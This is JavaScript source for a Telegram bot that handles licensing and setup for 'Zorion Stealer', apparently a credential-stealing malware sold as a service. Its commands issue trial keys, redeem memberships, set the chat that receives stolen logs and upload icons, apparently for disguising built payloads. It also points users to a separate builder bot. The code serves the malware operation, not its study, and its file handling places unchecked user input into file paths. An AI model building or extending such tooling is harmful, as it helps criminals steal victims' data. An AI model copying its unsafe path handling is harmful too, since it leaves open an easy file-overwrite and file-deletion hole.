const TelegramBot = require('node-telegram-bot-api');
const FormData = require('form-data');
const fs = require('fs-extra');
const axios = require('axios');
const { exec } = require('child_process');
const { MongoClient } = require('mongodb');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const username = os.userInfo().username;
const config = require(path.join('C:', 'Users', username, 'Desktop', 'Zorion Stealer', 'config.json'));

const uri = config.mongodbdbnamesiz;
const dbName = config.mongodbdbname;
const bot = new TelegramBot(config.setupbot, { polling: true });

function generateRandomString(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let randomString = '';
    for (let i = 0; i < length; i++) {
        randomString += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return randomString;
}

// Function to read a file asynchronously
async function readFile(filePath) {
    const data = await fs.readFile(filePath, { encoding: 'utf8' });
    return data;
}

// Function to write data to a file asynchronously
async function writeFile(filePath, data) {
    await fs.writeFile(filePath, data, 'utf8');
}

// Function to execute a command asynchronously
async function executeCommand(command) {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            } else {
                resolve({ stdout, stderr });
            }
        });
    });
}

async function updateKeyWebhook(usrkey, webhook, chatId) {
    try {
        const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
        await client.connect();
        const db = client.db(dbName);
        const collection = db.collection('keys');

        // Veritabanında anahtar var mı kontrol et
        const existingData = await collection.findOne({ Key: usrkey });

        if (existingData) {
            // Eğer anahtar zaten varsa, güncelle
            await collection.updateOne({ Key: usrkey }, { $set: { Webhook: webhook } });
            await bot.sendMessage(chatId, 'Webhook changed. ✔');
        } else {
            await bot.sendMessage(chatId, 'Key not found. ❌');
        }
    } catch (error) {
        console.error(error);
        await bot.sendMessage(chatId, '❌ An error occurred.');
    }
}

function generateKey() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < 16; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    const keyname = "ZORION-TRIAL-" + result;
    return keyname;
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // text değişkenini kontrol et
    if (text && text.toLowerCase() === '/start') {
        // Kullanıcıya /build komutunu kullanmalarını söyle
        await bot.sendMessage(chatId, `Add the @ZorionStealerLogBot bot to the group you will use as the log and then use the /change-chatid command, then go to the @ZorionBuilderBOT bot and use the /build command.`);
        return; // Bu noktada işlemi sonlandır
    }

    if (text && text.startsWith('/trial')) {
        const chatId = msg.chat.id;
        const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
        await client.connect();
        const db = client.db(dbName);
        const keysCollection = db.collection('keys'); 
        const trialcheck = db.collection('trial');
        const keycheck1 = await trialcheck.findOne({ chatid: chatId });
    
        if (keycheck1) {
            await bot.sendMessage(chatId, `lol`);
            await client.close();
            return;
        }

        const expirationTime = new Date(Date.now() + 86400000); // 1 gün sonrasını hesapla
        const generatedKey = generateKey();
    
        try {
            await keysCollection.insertOne({
                Key: generatedKey,
                Webhook: "",
                expiresAt: expirationTime
            });
            
            await trialcheck.insertOne({
                chatid : chatId
            });
            bot.sendMessage(msg.chat.id, `Trial key generated, use \`/redeem ${generatedKey}\` command.`, { parse_mode: 'Markdown' });
        } catch (err) {
            console.error(err);
            bot.sendMessage(msg.chat.id, 'Error generating key. Please try again later.');
        } finally {
            await client.close();
        }
    }

    if (text && text.startsWith('/change-chatid')) {
        const words = text.split(' ');
        usrkey = words[1] || '';
        chatidsq = words[2] || '';
        const chatId = msg.chat.id;

        if (!usrkey || !chatidsq) {
            await bot.sendMessage(chatId, `use: /change-chatid <yourkey> <yourchatid>`);
        } else {
            try {
                const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
                await client.connect();
                const db = client.db(dbName);
                const collection = db.collection('keys');
                const doc = await collection.findOne({ Key: usrkey });

                if (doc) {
                    const client1 = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
                    await client1.connect();
                    const db1 = client1.db(dbName); // Client1 kullanılmış, db1'e güncellendi
                     const keycheckCollection = db.collection('keyandchatidcheck');
                    const keycheck = await keycheckCollection.findOne({
                        key: usrkey,
                        chatId: `${chatId}`
                    });
        
                    if (!keycheck) {
                        // Anahtar bulunamadıysa
                        await bot.sendMessage(chatId, "lmfao");
                        return;
                    }
                
                    if (keycheck.chatId != chatId) {
                        // Eğer ne anahtar ne de chatId eşleşmiyorsa
                        await bot.sendMessage(chatId, `lmfao`);
                    }
                }
                const existingData = await collection.findOne({ Key: usrkey });

                if (existingData) {
                    await collection.updateOne({ Key: usrkey }, { $set: { chatId: chatidsq } });
                    await bot.sendMessage(chatId, 'chatid updated.');
                    return;
                }

                await bot.sendMessage(chatId, 'invalid key');
            } catch (error) {
                console.error(error);
                await bot.sendMessage(chatId, '❌');
            } 
        }}

    if (text && text.startsWith('/membership')) {
        const words = text.split(' ');
        usrkey = words[1] || '';
        const chatId = msg.chat.id;

    
        if (!usrkey) {
            await bot.sendMessage(chatId, `invalid key`);
        } else {
            try {
                const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
                await client.connect();
                const db = client.db(dbName);
                const collection = db.collection('keys');
                const keyDoc = await collection.findOne({ Key: usrkey });
    
                if (keyDoc) {
                    const expirationTime = keyDoc.expiresAt;
                    const currentTime = new Date();
                    const formattedExpiration = expirationTime.toLocaleString('en-US', { timeZone: 'UTC' });
                    
                    if (currentTime < expirationTime) {
                        const remainingTime = expirationTime - currentTime;
                        const remainingDays = Math.floor(remainingTime / (1000 * 60 * 60 * 24));
                        const remainingHours = Math.floor((remainingTime % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                        const remainingMinutes = Math.floor((remainingTime % (1000 * 60 * 60)) / (1000 * 60));
    
                        bot.sendMessage(
                            msg.chat.id,
                            `🎯 *Zorion Membership - Expiration Details*\n\n` +
                            `🔹 *Expires at:* ${formattedExpiration}\n` +
                            `🔹 *Remaining Time:*\n` +
                            `   🌟 *${remainingDays} days*\n` +
                            `   🌟 *${remainingHours} hours*\n` +
                            `   🌟 *${remainingMinutes} minutes*\n\n` +
                            `Please take action accordingly.`,
                            { parse_mode: 'Markdown' }
                        );
                    }
                } else {
                    bot.sendMessage(msg.chat.id, 'Invalid key. ❌');
                }
            } catch (err) {
                console.error(err);
                bot.sendMessage(msg.chat.id, 'database error ❌');
            }
        }
    }

    if (text && text.startsWith('/redeem')) {
        const words = text.split(' ');
        usrkey = words[1] || '';
        const chatId = msg.chat.id;

        if (!usrkey) {
            await bot.sendMessage(chatId, `invalid key`);
        } else {
            try {
                const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
                await client.connect();
                const db = client.db(dbName);
                const collection = db.collection('keys');
                const keyDoc = await collection.findOne({ Key: usrkey });
    
                if (keyDoc) {
                    const client1 = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
                    await client1.connect();
                    const db1 = client.db(dbName);
                     const keycheckCollection = db.collection('keyandchatidcheck');
                    const keycheck = await keycheckCollection.findOne({
                        key : usrkey,
                        claimed : true
                    });
                    if (keycheck){
                       await bot.sendMessage(chatId, `lol`)
                    }
                    else {
                        await keycheckCollection.insertOne({
                            key : `${usrkey}`,
                            chatId : `${chatId}`,
                            claimed : true
                        })
                        await bot.sendMessage(chatId, `Hello, your membership has been added to your account, you can use the "/membership ${usrkey}" command for your membership information. ✨`)
                    }
                    
                } else {
                    bot.sendMessage(msg.chat.id, 'invalid key');
                }
            } catch (err) {
                console.error(err);
                bot.sendMessage(msg.chat.id, 'database error ❌');
            }
        }
    }
    if (text && text.startsWith('/icon-reset')) {
        const words = text.split(' ');
        usrkey = words[1] || '';
        const chatId = msg.chat.id;
    
        if (!usrkey) {
            await bot.sendMessage(chatId, "invalid key");
        } else {
            try {
                const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
                await client.connect();
                const db = client.db(dbName);
                const collection = db.collection('keys');
                const doc = await collection.findOne({ Key: usrkey });
    
                if (doc) {
                    const client1 = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
                    await client1.connect();
                    const db1 = client1.db(dbName); // Client1 kullanılmış, db1'e güncellendi
                    const keycheckCollection = db1.collection('keyandchatidcheck');
                    const keycheck = await keycheckCollection.findOne({
                        key: usrkey,
                        chatId: `${chatId}`
                    });
    
                    if (!keycheck) {
                        // Anahtar bulunamadıysa
                        await bot.sendMessage(chatId, "lmfao");
                        return;
                    }
    
                    if (keycheck.chatId != chatId) {
                        // Eğer ne anahtar ne de chatId eşleşmiyorsa
                        await bot.sendMessage(chatId, "lmfao");
                    }
                }
                if (doc) {
                    // İkon dosyasını sil
                    const iconName = `${usrkey}.ico`;
                    const filePath = `./icon/${iconName}`;
    
                    fs.unlink(filePath, (err) => {
                        if (err) {
                            if (err.code === 'ENOENT') {
                                bot.sendMessage(chatId, 'icon not found');
                            } else {
                                console.error('An error occurred while deleting the icon:', err);
                                bot.sendMessage(chatId, `❌: ${err.message}`);
                            }
                        } else {
                            bot.sendMessage(chatId, 'Successfully! ✔');
                        }
                    });
                } else {
                    await bot.sendMessage(chatId, 'invalid key');
                }
            } catch (error) {
                console.error('An error occurred:', error);
                await bot.sendMessage(chatId, `❌: ${error.message}`);
            }
        }
    }
    if (text && text.startsWith('/change-icon')) {
        const words = text.split(' ');
        usrkey = words[1] || '';
        const chatId = msg.chat.id;
    
        if (!usrkey) {
            await bot.sendMessage(chatId, `invalid key`);
        } else {
            try {
                const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
                await client.connect();
                const db = client.db(dbName);
                const collection = db.collection('keys');
                const doc = await collection.findOne({ Key: usrkey });

                if (doc) {
                    const client1 = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
                    await client1.connect();
                    const db1 = client1.db(dbName); // Client1 kullanılmış, db1'e güncellendi
                     const keycheckCollection = db.collection('keyandchatidcheck');
                    const keycheck = await keycheckCollection.findOne({
                        key: usrkey,
                        chatId: `${chatId}`
                    });

                    if (!keycheck) {
                        // Anahtar bulunamadıysa
                        await bot.sendMessage(chatId, "lmfao");
                        return;
                    }
                
        
                    if (keycheck.chatId != chatId) {
                        // Eğer ne anahtar ne de chatId eşleşmiyorsa
                        await bot.sendMessage(chatId, `lmfao`);
                    }
                }
                if (doc) {
                    bot.sendMessage(chatId, 'Please send a file of "256x256 size" and ".ico format".');
    
                    bot.once('document', async (msg) => {
                        const fileId = msg.document.file_id;
    
                        // Dosya bilgisini al
                        const fileDetails = await bot.getFile(fileId);
    
                        // Dosyanın URL'sini oluştur
                        const fileURL = `https://api.telegram.org/file/bot${config.setupbot}/${fileDetails.file_path}`;
    
                        // Dosya boyutu kontrolü (25MB üstü olmamalı)
                        if (fileDetails.file_size > 25 * 256 * 256) {
                            return bot.sendMessage(chatId, 'File limit is 25mb. ❌');
                        }
    
                        // Debug: Print valid attachment information
                        console.log('Valid Attachment:', fileURL);
    
                        // Dosyayı kaydet
                        const iconName = `${usrkey}.ico`;
                        const filePath = `./icon/${iconName}`;
                        const response = await axios.get(fileURL, { responseType: 'stream' });
                        const fileStream = fs.createWriteStream(filePath);
                        response.data.pipe(fileStream);
    
                        bot.sendMessage(chatId, 'Successfully. ✔');
                    });
                } else {
                    await bot.sendMessage(chatId, 'invalid key');
                }
            } catch (error) {
                console.error('An error occurred:', error);
                await bot.sendMessage(chatId, `❌: ${error.message}`);
            }
        }
    }

});

